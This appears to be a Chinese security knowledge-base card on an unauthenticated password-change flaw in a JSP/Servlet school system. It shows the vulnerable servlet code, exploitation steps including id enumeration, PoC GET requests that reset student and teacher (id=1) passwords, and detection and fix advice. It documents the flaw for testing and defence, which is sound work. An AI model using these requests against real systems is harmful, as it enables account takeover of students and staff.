---
id: web-generic-auth-unauth-update-password-by-id-oldpwd-missing
title: JSP/Servlet 未授权改密接口：update_student_security / update_teacher_password 直接按请求 id 更新口令，不校验登录态、归属与旧密码
type: scenario
domain: web
path: web/generic/auth
technique: unauth-update-password-by-id-no-oldpwd
tags:
- web
- java
- servlet
- jsp
- authz
- idor
- password-reset
- missing-authentication
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
url: /docs/web/generic/auth/web-generic-auth-unauth-update-password-by-id-oldpwd-missing/
draft: false
kb_aliases:
- 未授权修改任意用户密码
- update_student_security 改密
- update_teacher_password 改密
- id 可控重置密码
- 无旧密码校验改密
- JSP Servlet 改密接口越权
---

## 一句话结论

把“改密”写成一个无鉴权的 Servlet：`update_student_security` 与 `update_teacher_password` 都从请求里直接取 `id`（学号/教师编号）与 `password`，随后调用 DAO 的 `update ... where id=?` 把口令覆盖掉——既不检查是否已登录、不检查 `id` 是否属于当前会话，也不要求旧密码或重置令牌。结果是一个 GET 请求就能把任意学生/教师的密码改成自己指定的值，改完直接用自己的口令登录接管账号。

## 原理

- **漏洞代码**（学生侧与教师侧同构）：
  ```java
  @WebServlet("/update_student_security")
  public class update_student_security extends HttpServlet {
      protected void doGet(HttpServletRequest request, HttpServletResponse response) {
          String id = request.getParameter("id");
          String email = request.getParameter("email");
          String password = request.getParameter("password");
          studentD.updateStudentSecurity(id, email, password);   // 直接更新
          out.print("<script>alert(\"修改成功\");window.location.href='login.jsp';</script>");
      }
  }
  ```
  DAO 虽然用了 `PreparedStatement`（`update student set password=?, email=? where id=?`），但**参数化只解决 SQL 注入，不解决授权**：谁都能指定 `id`，谁都能指定 `password`。
- **为什么是未授权**：`doGet` 全程没有 `session.getAttribute("info")` 之类的登录态判断，也没有 `id` 与会话用户比对；`@WebServlet` 直接映射到 `/update_student_security`，匿名请求即可命中。原文实测：浏览器地址栏直接访问
  `http://host:8081/web/update_student_security?id=20162430646&email=&password=123456`
  返回“修改成功”，目标账号密码被改为 `123456`。
- **为什么无需旧密码/令牌**：正常的自助改密流程应校验“当前口令”或“一次性重置 token”，并只允许改自己；这里两者都没有，等价于一个公开的“任意账号口令写入接口”。
- **教师侧同样存在**：`update_teacher_password` 只取 `id` 与 `password`（连 `email` 都不取），对应 `teacherD.updateTeacherPassword(id, password)`；原文用 `id=1`（通常是管理员/内置教师账号）实测成功。
- **为什么危害是账号接管而不是“信息泄露”**：改密成功后攻击者用自己的新口令走正常登录流程，拿到目标账号的全部权限（学生可看/改自己的成绩与资料，教师可管成绩、导出 Excel、管理学生），且日志上看起来是一次合法登录。
- **与“越权改密”的区别**：`web-generic-auth-authenticated-change-password-idor` 是“已登录用户把 username 改成别人”，本卡更弱——**连登录都不需要**，属于完全缺失认证（unauthenticated），利用门槛只有一个已知 `id`。
- **前置信息从哪来**：学号/教师编号常可从登录页提示、公开名单、成绩单、URL 参数、`findWithId` 的其它接口枚举得到；原文直接用了页面里可见的学号。

## 触发条件

- 目标为 JSP/Servlet 教学/教务系统，存在 `update_student_security` / `update_teacher_password` 一类“改密”Servlet 且被 `@WebServlet` 暴露。
- 该 Servlet 未做登录态校验、未校验 `id` 归属、未要求旧密码或重置令牌。
- 攻击者知道或能枚举目标账号的 `id`（学号/教师编号）。
- 服务端对改密接口没有频率限制/审计告警（老系统通常没有）。
- 仅用于授权测试；不要对生产环境的真实账号执行批量改密。

## 利用步骤

1. **发现接口**：目录/接口扫描或读前端 `login.jsp`、`personal.jsp` 的表单 action，找到 `update_student_security`、`update_teacher_password` 等路径。
2. **确认无鉴权**：用无 Cookie 的干净会话直接请求，观察是否返回“修改成功”而不是跳登录/401。
3. **枚举目标 id**：学号通常是连续数字（`20162430634`、`20162430635`…），教师 id 常为小整数（`1` 多为内置管理员）。
4. **改密**：`GET /web/update_student_security?id=<目标>&email=&password=<新口令>`；教师侧 `GET /web/update_teacher_password?id=<目标>&password=<新口令>`。
5. **验证接管**：用目标 id + 新口令登录，确认进入目标角色的主页面（学生页/教师页差异可确认身份线）。
6. **收尾**：记录被修改的账号（授权测试应恢复原口令或由客户重置），不要批量遍历造成业务影响。

## PoC

学生改密（原文实测请求）：

```http
GET /web/update_student_security?id=20162430646&email=&password=123456 HTTP/1.1
Host: target:8081
```

响应：`<script>alert("修改成功");window.location.href='login.jsp';</script>`

教师改密：

```http
GET /web/update_teacher_password?id=1&password=123456 HTTP/1.1
Host: target:8081
```

随后用新口令登录：

```http
POST /web/check_login HTTP/1.1
Host: target:8081
Content-Type: application/x-www-form-urlencoded

user=20162430646&password=123456&remember=
```

预期进入学生/教师主页并带登录态。

## 变体与关联

- 变体：接口改成 POST 或接受 `email`、`name` 等额外字段时同理；关键在“目标 id 由客户端提交 + 无授权校验”。
- 变体：若接口要求登录但 `id`/`username` 可控，退化为“已登录越权改密”（见 `web-generic-auth-authenticated-change-password-idor`）；两者只差一个前置登录态。
- 变体：部分系统把改密写在 `sendCode.jsp`/`index.jsp` 里（同项目里 `findWithId` 就被 JSP 直接调用），需逐页确认是否也缺鉴权。
- 关联：[[web-generic-auth-authenticated-change-password-idor]]（登录后越权改密的近亲形态）。
- 关联：[[web-generic-auth-xiaozhi-unauth-user-update-password-reset]]（同样是“白名单放行 + 不校验旧密码 + 按 username 更新”的未授权重置）。
- 关联：[[web-generic-auth-password-reset-username-tampering]]（重置表单隐藏字段可篡改的目标用户）。
- 关联：[[web-generic-auth-uid-resetpwd-hardcoded-default-password]]（按 uid 重置且使用固定默认口令）。
- 关联：[[web-generic-sqli-java-jdbc-statement-login-concat-multi-dao]]（同一系统的登录注入；两卡共用“同一套老式 Servlet 无防护”的根因）。
- 边界：目标若在网关层要求登录、或 `id` 与会话强绑定、或改密需要短信/邮箱令牌，本链不成立；接口存在但 DAO 未真正更新（如 `id` 不存在）时会返回成功但无效果，需用登录验证。

## 检测与防御

- 修复：改密接口必须从服务端会话取当前用户，**不接受客户端提交的目标 id**；管理员代改需单独的、受 RBAC 保护的接口。
- 修复：自助改密要求校验旧密码或一次性重置令牌（邮件/短信），令牌一次性、绑定账号与短时效。
- 加固：所有“改密/改邮箱/改角色”等敏感 Servlet 统一加登录拦截（Filter 白名单默认拒绝），不要在 `@WebServlet` 上裸奔。
- 加固：改密成功后强制该账号其它会话失效并通知用户；对新口令做强度校验。
- 检测：匿名请求命中 `update_*password*`/`update_*security*` 类路径并返回成功文案；同一 IP 对多个 id 提交改密；改密后立即出现该账号登录。
- 检测：审计“目标 id 与会话用户不一致”的改密请求，以及短时间内大量 200 的改密响应。
